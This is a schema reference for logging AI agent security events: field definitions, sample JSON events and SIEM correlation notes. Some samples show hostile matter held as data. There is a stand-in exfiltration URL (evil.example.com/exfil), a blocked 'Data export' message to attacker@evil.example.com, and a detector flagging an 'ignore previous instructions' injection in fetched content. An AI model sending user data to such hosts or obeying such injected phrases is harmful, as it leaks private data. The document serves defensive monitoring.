# AI Security Event Log Schema

**Schema Version:** 1.0
<!-- schema_version: "1.0" — bump to "1.1" on any breaking field change; add new optional fields as minors -->

This document defines the canonical event schema for AI agent security telemetry. Events are produced by the agent framework, detectors, and policy gateway, then consumed by SIEM pipelines, SOAR playbooks, and offline analysis.

---

## Field Reference

### `event_id`

| Attribute | Value |
|-----------|-------|
| Type | string (UUID v4) |
| Required | Yes |
| Description | Globally unique identifier for this event. Generated at emit time. Used as a primary key when deduplicating across ingestion pipelines. |
| Example | `"7f3a1c2e-4b5d-4e6f-8a9b-0c1d2e3f4a5b"` |

---

### `ts`

| Attribute | Value |
|-----------|-------|
| Type | string (ISO 8601 UTC) |
| Required | Yes |
| Description | Timestamp when the event was generated, in UTC. Always includes millisecond precision. Must end with `Z`. Used for ordering events within a session and for time-windowed SIEM queries. |
| Example | `"2025-08-14T10:23:45.123Z"` |

---

### `agent_id`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | Yes |
| Description | Logical identifier for the agent type or deployment. Not unique per invocation — multiple sessions share the same `agent_id`. Used to scope baselines (e.g., "what is normal tool-call frequency for this agent?"). |
| Example | `"research-assistant-v2"` |

---

### `session_id`

| Attribute | Value |
|-----------|-------|
| Type | string (UUID v4) |
| Required | Yes |
| Description | Unique identifier for a single conversation or task execution. All events within one agent invocation share the same `session_id`. Essential for reconstructing the full event chain for an incident. |
| Example | `"a1b2c3d4-e5f6-7890-abcd-ef1234567890"` |

---

### `step`

| Attribute | Value |
|-----------|-------|
| Type | integer |
| Required | Yes |
| Description | Zero-indexed position of this event within the agent loop for the current session. Step 0 is always the initial model call. Monotonically increasing per session. Used to detect runaway loops (AI-009) and to reconstruct causality chains. |
| Example | `3` |

---

### `event_type`

| Attribute | Value |
|-----------|-------|
| Type | enum |
| Required | Yes |
| Allowed values | `model_call` \| `tool_call` \| `tool_result` \| `detector_hit` \| `policy_violation` \| `human_review_requested` \| `final_response` |
| Description | Classifies what kind of agent action or observation this event represents. Drives alert routing rules (see alert-catalog.md). |
| Example | `"tool_call"` |

**Enum values:**

| Value | Meaning |
|-------|---------|
| `model_call` | The agent framework sent a prompt to the LLM and received a response. |
| `tool_call` | The agent requested execution of a tool (web_fetch, read_doc, send_message, etc.). |
| `tool_result` | The framework received the return value from a tool execution. |
| `detector_hit` | A security detector (rules or classifier) flagged the content of a prompt, response, or tool result. |
| `policy_violation` | The tool gateway blocked a requested action due to policy. |
| `human_review_requested` | The agent or policy layer requested a human decision before proceeding. |
| `final_response` | The agent produced its final answer to the user. |

---

### `model`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | No (present on `model_call` events) |
| Description | The model identifier passed to the API for this call. Allows retrospective analysis of whether a model update changed security behavior. |
| Example | `"claude-sonnet-4-5"` |

---

### `prompt_hash`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | No (present on `model_call` events) |
| Description | First 16 hex characters of the SHA-256 hash of the system prompt. Not the full hash — this is a short fingerprint for regression tracking, not a cryptographic guarantee. When this value changes between sessions for the same `agent_id`, it indicates the system prompt was modified. |
| Example | `"a3f7c1d8e2b04591"` |

---

### `tool_name`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | No (present on `tool_call` and `tool_result` events) |
| Description | The name of the tool that was called or whose result was received. Drives allowlist checks and per-tool quota enforcement. |
| Example | `"web_fetch"` |

Common values: `web_fetch`, `read_doc`, `send_message`, `execute_code`, `list_files`, `write_file`

---

### `tool_args_redacted`

| Attribute | Value |
|-----------|-------|
| Type | object |
| Required | No (present on `tool_call` events) |
| Description | The arguments passed to the tool, with sensitive values replaced by redaction markers. Redacted fields include authentication tokens, API keys, passwords, and PII. The structure mirrors the original args object. Retains enough information to assess intent (URL domain, recipient domain, file path prefix) without logging raw secrets. |
| Example | `{"url": "https://evil.example.com/exfil", "headers": {"Authorization": "[REDACTED]"}}` |

---

### `tool_result_size`

| Attribute | Value |
|-----------|-------|
| Type | integer |
| Required | No (present on `tool_result` events) |
| Description | Size in bytes of the tool result content before any truncation. Large results (e.g., web pages) may indicate data harvesting. Used in conjunction with detector analysis of the content. |
| Example | `148320` |

---

### `detector_name`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | No (present on `detector_hit` events) |
| Description | Identifier for the specific detector component that fired. Distinguishes rule-based detectors from ML classifiers. Used to tune alert thresholds per detector type. |
| Example | `"rules_detector"` |

Common values: `rules_detector`, `classifier_detector`, `output_filter`

---

### `detector_score`

| Attribute | Value |
|-----------|-------|
| Type | float |
| Required | No (present on `detector_hit` events) |
| Description | Confidence score from the detector, in the range 0.0 to 1.0. Higher values indicate greater confidence that the content is malicious. Thresholds vary by alert (see alert-catalog.md). |
| Example | `0.87` |

---

### `severity`

| Attribute | Value |
|-----------|-------|
| Type | enum |
| Required | No |
| Allowed values | `low` \| `medium` \| `high` \| `critical` |
| Description | Pre-computed severity level for this event, set by the detector or policy layer. SOAR playbooks use this for initial triage routing. May be overridden by correlation rules. |
| Example | `"high"` |

---

### `trifecta_legs_active`

| Attribute | Value |
|-----------|-------|
| Type | array of strings |
| Required | No |
| Description | Subset of the three "trifecta" preconditions that have been observed in this session. The three legs are: `"data"` (agent has access to sensitive data), `"untrusted_input"` (agent has processed content from an untrusted source), and `"egress"` (agent has a channel to send data externally). When all three are present, the session is at critical risk (AI-006). |
| Example | `["data", "untrusted_input"]` |

---

### `user_id`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | No |
| Description | Identifier for the end-user who initiated the agent session. Used for per-user rate limiting (AI-011) and for correlating attacks targeting a specific user's account. Should be an opaque identifier, not a raw email address. |
| Example | `"usr_7a3f9c12"` |

---

### `org_id`

| Attribute | Value |
|-----------|-------|
| Type | string |
| Required | No |
| Description | Identifier for the organization in multi-tenant deployments. Ensures alert correlation is scoped to the correct tenant and enables per-org baseline computation. |
| Example | `"org_acme_prod"` |

---

### `metadata`

| Attribute | Value |
|-----------|-------|
| Type | object |
| Required | No |
| Description | Extensible key-value map for platform-specific or context-specific data not covered by the fixed schema. Keys should use `snake_case`. SOAR playbooks may reference specific metadata keys (e.g., `metadata.gateway_blocked`, `metadata.adapter_fallback`). |
| Example | `{"gateway_blocked": true, "policy_rule": "no_external_email", "request_id": "req_abc123"}` |

---

## Event Type Examples

### 1. `model_call`

```json
{
  "event_id": "1a2b3c4d-0001-0001-0001-000000000001",
  "ts": "2025-08-14T10:23:44.000Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 0,
  "event_type": "model_call",
  "model": "claude-sonnet-4-5",
  "prompt_hash": "a3f7c1d8e2b04591",
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "input_tokens": 1240,
    "output_tokens": 312,
    "request_id": "req_abc123"
  }
}
```

### 2. `tool_call`

```json
{
  "event_id": "1a2b3c4d-0002-0002-0002-000000000002",
  "ts": "2025-08-14T10:23:45.500Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 1,
  "event_type": "tool_call",
  "tool_name": "web_fetch",
  "tool_args_redacted": {
    "url": "https://docs.example.com/api-reference",
    "method": "GET",
    "headers": {}
  },
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "tool_call_id": "tc_00001"
  }
}
```

### 3. `tool_result`

```json
{
  "event_id": "1a2b3c4d-0003-0003-0003-000000000003",
  "ts": "2025-08-14T10:23:46.200Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 2,
  "event_type": "tool_result",
  "tool_name": "web_fetch",
  "tool_result_size": 24580,
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "tool_call_id": "tc_00001",
    "status_code": 200,
    "content_type": "text/html"
  }
}
```

### 4. `detector_hit`

```json
{
  "event_id": "1a2b3c4d-0004-0004-0004-000000000004",
  "ts": "2025-08-14T10:23:46.350Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 2,
  "event_type": "detector_hit",
  "detector_name": "classifier_detector",
  "detector_score": 0.91,
  "severity": "high",
  "trifecta_legs_active": ["untrusted_input"],
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "matched_pattern": "ignore_previous_instructions",
    "scan_target": "tool_result",
    "tool_call_id": "tc_00001"
  }
}
```

### 5. `policy_violation`

```json
{
  "event_id": "1a2b3c4d-0005-0005-0005-000000000005",
  "ts": "2025-08-14T10:23:47.100Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 3,
  "event_type": "policy_violation",
  "tool_name": "send_message",
  "tool_args_redacted": {
    "recipient": "attacker@evil.example.com",
    "subject": "Data export",
    "body": "[REDACTED: 4200 chars]"
  },
  "severity": "critical",
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "gateway_blocked": true,
    "policy_rule": "recipient_not_in_allowlist",
    "policy_rule_id": "POL-0042"
  }
}
```

### 6. `human_review_requested`

```json
{
  "event_id": "1a2b3c4d-0006-0006-0006-000000000006",
  "ts": "2025-08-14T10:24:00.000Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 4,
  "event_type": "human_review_requested",
  "severity": "high",
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "review_reason": "detector_score_threshold_exceeded",
    "review_queue": "security-review-prod",
    "expires_at": "2025-08-14T10:54:00.000Z",
    "checkpoint_id": "chk_00099"
  }
}
```

### 7. `final_response`

```json
{
  "event_id": "1a2b3c4d-0007-0007-0007-000000000007",
  "ts": "2025-08-14T10:24:15.800Z",
  "agent_id": "research-assistant-v2",
  "session_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "step": 5,
  "event_type": "final_response",
  "severity": "low",
  "user_id": "usr_7a3f9c12",
  "org_id": "org_acme_prod",
  "metadata": {
    "response_length_chars": 1842,
    "output_filter_violations": [],
    "output_filter_passed": true
  }
}
```

---

## SIEM Integration Notes

Traditional SIEM rules are designed around infrastructure telemetry: network flows, authentication logs, and HTTP request/response pairs. AI agent events do not map cleanly onto these models. The following explains why standard rules underperform and what adaptations are required.

### Tool calls have no HTTP request/response analog

A `tool_call` event is not an HTTP request. It represents an LLM's decision to invoke a capability — a semantic action, not a transport-layer event. The "request" and "response" are separated by tool execution time and may trigger downstream events (new model calls, more tool calls) that have no equivalent in traditional request logs. SIEM rules that look for `src_ip`, `dst_ip`, and `http_status` will find nothing actionable in tool call logs. Instead, correlation must span `tool_call` → `tool_result` → `detector_hit` within a shared `session_id`.

### Multi-step sessions span seconds to minutes with non-linear causality

A single agent session may last 30 seconds or 10 minutes and contain 3 to 20+ discrete events. Causality is not linear: a `detector_hit` at step 2 may be caused by a `tool_result` at step 2 that was triggered by a `tool_call` at step 1 that was produced by a `model_call` at step 0. Standard SIEM correlation windows (e.g., 60-second sliding windows) may split a single attack chain across two windows. Correlation must be session-scoped using `session_id` as the grouping key, with `step` providing ordering.

### "Anomalous" behavior requires comparison to the agent's own baseline, not global baselines

A web fetch tool call is routine for a research agent but anomalous for a document summarization agent. Global SIEM baselines ("is this unusual for any user?") produce excessive false positives. Accurate anomaly detection requires per-`agent_id` baselines: how many tool calls does this agent typically make per session? What domains does it typically fetch? What is its normal `detector_score` distribution? The `agent_id` field enables this segmentation.

### `prompt_hash` enables drift detection

The first 16 hex characters of the SHA-256 hash of the system prompt provide a short fingerprint that is stable across sessions as long as the system prompt does not change. When `prompt_hash` changes for the same `agent_id` between sessions, it indicates the agent's instructions were modified — by a developer, a configuration management system, or potentially an attacker who gained access to the agent configuration. SIEM rules should alert when `prompt_hash` changes without a corresponding deployment event in the change management log. This is particularly valuable for detecting unauthorized system prompt modifications that could relax safety constraints.
